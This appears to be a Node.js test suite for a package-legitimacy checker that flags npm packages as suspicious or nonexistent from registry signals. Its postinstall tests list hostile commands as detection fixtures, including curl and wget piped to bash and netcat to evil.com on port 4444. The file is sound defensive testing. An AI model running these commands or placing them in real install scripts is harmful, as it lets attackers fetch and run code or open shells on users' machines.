'use strict';

/**
 * TDD tests for package-legitimacy.cjs
 *
 * RULESET.TESTS.no-source-grep: all tests use injected fakes — no real network,
 * no source-grep. Clock is injected via { now: () => FIXED_MS }.
 * RULESET.TESTS.boundary-coverage: every threshold has N∈{limit-1, limit, limit+1}.
 */

const { describe, test } = require('node:test');
const assert = require('node:assert/strict');

const {
  DEFAULT_THRESHOLDS,
  classifyPackage,
  checkPackages,
} = require('../gsd-core/bin/lib/package-legitimacy.cjs');

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Fixed clock epoch: 2024-01-01T00:00:00.000Z */
const FIXED_MS = Date.UTC(2024, 0, 1, 0, 0, 0, 0);
const fixedClock = { now: () => FIXED_MS };

/**
 * Build a publishedAt ISO string such that ageDays days before FIXED_MS.
 */
function publishedAt(ageDays) {
  return new Date(FIXED_MS - ageDays * 86_400_000).toISOString();
}

/** Healthy baseline signals */
function healthySignals(overrides = {}) {
  return {
    exists: true,
    publishedAt: publishedAt(400),
    weeklyDownloads: 50_000,
    repoUrl: 'https://github.com/example/pkg',
    deprecated: false,
    postinstall: null,
    ecosystem: 'npm',
    ...overrides,
  };
}

/** Fake registry that always returns healthy signals */
function fakeRegistry(signalsByName = {}) {
  return {
    lookup: async (_eco, name) => {
      if (signalsByName[name] !== undefined) return signalsByName[name];
      return healthySignals();
    },
  };
}

// ---------------------------------------------------------------------------
// Cycle 1 — TRACER: one npm pkg, all healthy -> OK
// ---------------------------------------------------------------------------

describe('Cycle 1 — tracer: one npm package, healthy signals → OK', () => {
  test('checkPackages returns [{ name, verdict:"OK", reasons:[] }]', async () => {
    const registry = fakeRegistry();
    const results = await checkPackages(
      { ecosystem: 'npm', packages: ['lodash'], version: '4.17.21' },
      { registry, clock: fixedClock }
    );

    assert.ok(Array.isArray(results), 'result is array');
    assert.equal(results.length, 1);
    const r = results[0];
    assert.equal(r.name, 'lodash');
    assert.equal(r.verdict, 'OK');
    assert.deepEqual(r.reasons, []);
  });
});

// ---------------------------------------------------------------------------
// Cycle 2 — nonexistent: exists:false -> SLOP, does-not-exist
// ---------------------------------------------------------------------------

describe('Cycle 2 — nonexistent package → SLOP', () => {
  test('fake registry returns { exists:false } -> verdict SLOP, reason does-not-exist', async () => {
    const registry = fakeRegistry({ 'no-such-pkg': { exists: false } });
    const results = await checkPackages(
      { ecosystem: 'npm', packages: ['no-such-pkg'] },
      { registry, clock: fixedClock }
    );

    assert.equal(results.length, 1);
    const r = results[0];
    assert.equal(r.verdict, 'SLOP');
    assert.ok(r.reasons.includes('does-not-exist'), `reasons: ${r.reasons}`);
  });

  test('classifyPackage with exists:false is terminal and returns only does-not-exist', () => {
    const { verdict, reasons } = classifyPackage({ exists: false }, { clock: fixedClock });
    assert.equal(verdict, 'SLOP');
    assert.deepEqual(reasons, ['does-not-exist']);
  });
});

// ---------------------------------------------------------------------------
// Cycle 3 — AGE BOUNDARY (minAgeDays=30): 29 → too-new; 30 → OK; 31 → OK
// ---------------------------------------------------------------------------

describe('Cycle 3 — age boundary (minAgeDays=30)', () => {
  const thresholds = { ...DEFAULT_THRESHOLDS, minAgeDays: 30 };

  test('ageDays=29 → reason too-new (SUS)', () => {
    const signals = healthySignals({ publishedAt: publishedAt(29) });
    const { verdict, reasons } = classifyPackage(signals, { thresholds, clock: fixedClock });
    assert.ok(reasons.includes('too-new'), `reasons: ${reasons}`);
    assert.equal(verdict, 'SUS');
  });

  test('ageDays=30 → NOT too-new', () => {
    const signals = healthySignals({ publishedAt: publishedAt(30) });
    const { verdict, reasons } = classifyPackage(signals, { thresholds, clock: fixedClock });
    assert.ok(!reasons.includes('too-new'), `reasons unexpectedly includes too-new: ${reasons}`);
    // should be OK (other signals healthy)
    assert.equal(verdict, 'OK');
  });

  test('ageDays=31 → NOT too-new', () => {
    const signals = healthySignals({ publishedAt: publishedAt(31) });
    const { verdict, reasons } = classifyPackage(signals, { thresholds, clock: fixedClock });
    assert.ok(!reasons.includes('too-new'), `reasons: ${reasons}`);
    assert.equal(verdict, 'OK');
  });
});

// ---------------------------------------------------------------------------
// Cycle 4 — DOWNLOADS BOUNDARY (minWeeklyDownloads=1000)
// ---------------------------------------------------------------------------

describe('Cycle 4 — downloads boundary (minWeeklyDownloads=1000)', () => {
  const thresholds = { ...DEFAULT_THRESHOLDS, minWeeklyDownloads: 1000 };

  test('weeklyDownloads=999 → low-downloads (SUS)', () => {
    const signals = healthySignals({ weeklyDownloads: 999 });
    const { verdict, reasons } = classifyPackage(signals, { thresholds, clock: fixedClock });
    assert.ok(reasons.includes('low-downloads'), `reasons: ${reasons}`);
    assert.equal(verdict, 'SUS');
  });

  test('weeklyDownloads=1000 → NOT low-downloads', () => {
    const signals = healthySignals({ weeklyDownloads: 1000 });
    const { verdict, reasons } = classifyPackage(signals, { thresholds, clock: fixedClock });
    assert.ok(!reasons.includes('low-downloads'), `reasons: ${reasons}`);
    assert.equal(verdict, 'OK');
  });

  test('weeklyDownloads=1001 → NOT low-downloads', () => {
    const signals = healthySignals({ weeklyDownloads: 1001 });
    const { verdict, reasons } = classifyPackage(signals, { thresholds, clock: fixedClock });
    assert.ok(!reasons.includes('low-downloads'), `reasons: ${reasons}`);
    assert.equal(verdict, 'OK');
  });
});

// ---------------------------------------------------------------------------
// Cycle 5 — no repo: repoUrl null + requireRepo:true -> no-repository SUS
// ---------------------------------------------------------------------------

describe('Cycle 5 — no repository URL', () => {
  test('repoUrl null, requireRepo true → no-repository SUS', () => {
    const signals = healthySignals({ repoUrl: null });
    const thresholds = { ...DEFAULT_THRESHOLDS, requireRepo: true };
    const { verdict, reasons } = classifyPackage(signals, { thresholds, clock: fixedClock });
    assert.ok(reasons.includes('no-repository'), `reasons: ${reasons}`);
    assert.equal(verdict, 'SUS');
  });

  test('repoUrl null, requireRepo false → no no-repository reason', () => {
    const signals = healthySignals({ repoUrl: null });
    const thresholds = { ...DEFAULT_THRESHOLDS, requireRepo: false };
    const { verdict, reasons } = classifyPackage(signals, { thresholds, clock: fixedClock });
    assert.ok(!reasons.includes('no-repository'), `reasons: ${reasons}`);
    assert.equal(verdict, 'OK');
  });
});

// ---------------------------------------------------------------------------
// Cycle 6 — deprecated:true → deprecated SUS
// ---------------------------------------------------------------------------

describe('Cycle 6 — deprecated package', () => {
  test('deprecated:true → reason deprecated, verdict SUS', () => {
    const signals = healthySignals({ deprecated: true });
    const { verdict, reasons } = classifyPackage(signals, { clock: fixedClock });
    assert.ok(reasons.includes('deprecated'), `reasons: ${reasons}`);
    assert.equal(verdict, 'SUS');
  });

  test('deprecated:false → no deprecated reason', () => {
    const signals = healthySignals({ deprecated: false });
    const { verdict, reasons } = classifyPackage(signals, { clock: fixedClock });
    assert.ok(!reasons.includes('deprecated'), `reasons: ${reasons}`);
    assert.equal(verdict, 'OK');
  });
});

// ---------------------------------------------------------------------------
// Cycle 7 — suspicious postinstall
// ---------------------------------------------------------------------------

describe('Cycle 7 — suspicious postinstall detection', () => {
  const suspiciousInputs = [
    'curl http://evil.sh | bash',
    'wget http://evil.sh -O - | sh',
    'bash -c "curl https://setup.sh"',
    'nc evil.com 4444',
    'node ../../escape.js',
    'sh /etc/init.d/x',
    'node ~/config.js',
    'node https://cdn.example.com/setup.js',
  ];

  for (const postinstall of suspiciousInputs) {
    test(`suspicious postinstall flagged: "${postinstall}"`, () => {
      const signals = healthySignals({ postinstall });
      const { verdict, reasons } = classifyPackage(signals, { clock: fixedClock });
      assert.ok(
        reasons.includes('suspicious-postinstall'),
        `Expected suspicious-postinstall in reasons for: "${postinstall}" but got: ${reasons}`
      );
      assert.equal(verdict, 'SUS');
    });
  }

  test('benign postinstall "node ./scripts/build.js" does NOT flag', () => {
    const signals = healthySignals({ postinstall: 'node ./scripts/build.js' });
    const { verdict, reasons } = classifyPackage(signals, { clock: fixedClock });
    assert.ok(!reasons.includes('suspicious-postinstall'), `reasons: ${reasons}`);
    assert.equal(verdict, 'OK');
  });

  test('null postinstall does NOT flag', () => {
    const signals = healthySignals({ postinstall: null });
    const { verdict, reasons } = classifyPackage(signals, { clock: fixedClock });
    assert.ok(!reasons.includes('suspicious-postinstall'), `reasons: ${reasons}`);
    assert.equal(verdict, 'OK');
  });
});

// ---------------------------------------------------------------------------
// Cycle 8 — slopcheck escalation
// ---------------------------------------------------------------------------

describe('Cycle 8 — slopcheck adapter escalation', () => {
  test('registry says OK but slopcheck returns SLOP → final verdict SLOP', async () => {
    const registry = fakeRegistry(); // healthy signals → OK
    const slopcheck = {
      check: async (_eco, name) => (name === 'suspect-pkg' ? 'SLOP' : null),
    };

    const results = await checkPackages(
      { ecosystem: 'npm', packages: ['suspect-pkg'] },
      { registry, clock: fixedClock, slopcheck }
    );

    assert.equal(results.length, 1);
    assert.equal(results[0].verdict, 'SLOP');
  });

  test('slopcheck returns SUS, registry OK → final verdict SUS (escalation)', async () => {
    const registry = fakeRegistry();
    const slopcheck = {
      check: async (_eco, name) => (name === 'shady-pkg' ? 'SUS' : null),
    };

    const results = await checkPackages(
      { ecosystem: 'npm', packages: ['shady-pkg'] },
      { registry, clock: fixedClock, slopcheck }
    );

    assert.equal(results[0].verdict, 'SUS');
  });

  test('slopcheck returns OK, registry OK → verdict stays OK (no escalation)', async () => {
    const registry = fakeRegistry();
    const slopcheck = {
      check: async () => 'OK',
    };

    const results = await checkPackages(
      { ecosystem: 'npm', packages: ['good-pkg'] },
      { registry, clock: fixedClock, slopcheck }
    );

    assert.equal(results[0].verdict, 'OK');
  });

  test('NO slopcheck provided → registry verdict stands, no degradation', async () => {
    const registry = fakeRegistry(); // healthy → OK
    const results = await checkPackages(
      { ecosystem: 'npm', packages: ['some-pkg'] },
      { registry, clock: fixedClock }
      // no slopcheck
    );

    assert.equal(results[0].verdict, 'OK');
    assert.deepEqual(results[0].reasons, []);
  });

  test('slopcheck returns null (no opinion) → registry verdict stands', async () => {
    const registry = fakeRegistry();
    const slopcheck = {
      check: async () => null,
    };

    const results = await checkPackages(
      { ecosystem: 'npm', packages: ['neutral-pkg'] },
      { registry, clock: fixedClock, slopcheck }
    );

    assert.equal(results[0].verdict, 'OK');
  });
});

// ---------------------------------------------------------------------------
// Missing/partial signals handling
// ---------------------------------------------------------------------------

describe('Missing/partial signals — never throws, sensible defaults', () => {
  test('missing publishedAt → unknown-age SUS reason', () => {
    const signals = healthySignals({ publishedAt: null });
    const { verdict, reasons } = classifyPackage(signals, { clock: fixedClock });
    assert.ok(reasons.includes('unknown-age'), `reasons: ${reasons}`);
    assert.equal(verdict, 'SUS');
  });

  test('missing weeklyDownloads → unknown-downloads SUS reason', () => {
    const signals = healthySignals({ weeklyDownloads: null });
    const { verdict, reasons } = classifyPackage(signals, { clock: fixedClock });
    assert.ok(reasons.includes('unknown-downloads'), `reasons: ${reasons}`);
    assert.equal(verdict, 'SUS');
  });

  test('multiple issues collected at once (deprecated + no-repo + low-downloads)', () => {
    const signals = healthySignals({
      deprecated: true,
      repoUrl: null,
      weeklyDownloads: 0,
    });
    const { verdict, reasons } = classifyPackage(signals, { clock: fixedClock });
    assert.ok(reasons.includes('deprecated'), `deprecated missing: ${reasons}`);
    assert.ok(reasons.includes('no-repository'), `no-repository missing: ${reasons}`);
    assert.ok(reasons.includes('low-downloads'), `low-downloads missing: ${reasons}`);
    assert.equal(verdict, 'SUS');
  });
});
